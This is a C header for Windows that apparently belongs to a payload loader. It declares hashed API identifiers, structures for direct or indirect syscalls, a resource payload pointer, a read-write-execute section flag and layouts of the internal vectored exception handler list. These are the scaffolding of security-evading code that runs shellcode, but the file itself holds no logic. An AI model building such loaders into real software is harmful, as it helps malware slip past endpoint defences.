#pragma once
#include <Windows.h>
#include <winternl.h>

#define H_NCS   ( 0xb80f7b50 )
#define H_NMVOS ( 0xd6649bca )
#define H_NPVM  ( 0x50e92888 ) 
#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)

typedef struct _PE_STUFF {
    PDWORD      pdwArrayOfAddresses;
    PDWORD      pdwArrayOfNames;
    PWORD       pwArrayOfOrdinals;
    DWORD       dwNumberOfNames;
    ULONG_PTR   uNtdll;
    PBYTE       pRsrcPayload;
    DWORD       dwRsrc;
}PE_STUFF, * PPE_STUFF;

typedef struct _NT_SYSCALL {
    DWORD   dwSSN;
    PVOID   pSyscallAddress;
}NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTAPI_FUNC {
    NT_SYSCALL  NtCreateSection;
    NT_SYSCALL  NtMapViewOfSection;
    NT_SYSCALL  NtProtectVirtualMemory;
}NTAPI_FUNC, * PNTAPI_FUNC;

typedef struct _VEH_HANDLER_ENTRY {
    LIST_ENTRY					Entry;
    PVOID						SyncRefs;
    PVOID						Idk;
    PVOID						VectoredHandler;
} VEH_HANDLER_ENTRY, * PVEH_HANDLER_ENTRY;

typedef struct _VECTORED_HANDLER_LIST {
    PVOID              MutexException;
    VEH_HANDLER_ENTRY* FirstExceptionHandler;
    VEH_HANDLER_ENTRY* LastExceptionHandler;
    PVOID              MutexContinue;
    VEH_HANDLER_ENTRY* FirstContinueHandler;
    VEH_HANDLER_ENTRY* LastContinueHandler;
} VECTORED_HANDLER_LIST, * PVECTORED_HANDLER_LIST;

//------------------------------------------------------------------

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
    PHANDLE				SectionHandle,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PLARGE_INTEGER		MaximumSize,
    ULONG				SectionPageProtection,
    ULONG				AllocationAttributes,
    HANDLE				FileHandle
    );

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
    HANDLE				SectionHandle,
    HANDLE				ProcessHandle,
    PVOID*              BaseAddress,
    ULONG_PTR			ZeroBits,
    SIZE_T				CommitSize,
    PLARGE_INTEGER		SectionOffset,
    PSIZE_T				ViewSize,
    ULONG       		InheritDisposition,
    ULONG				AllocationType,
    ULONG				Win32Protect
    );

typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
    HANDLE              ProcessHandle,
    PVOID*              BaseAddress,
    PSIZE_T             RegionSize,
    ULONG               NewProtect,
    PULONG              OldProtect
    );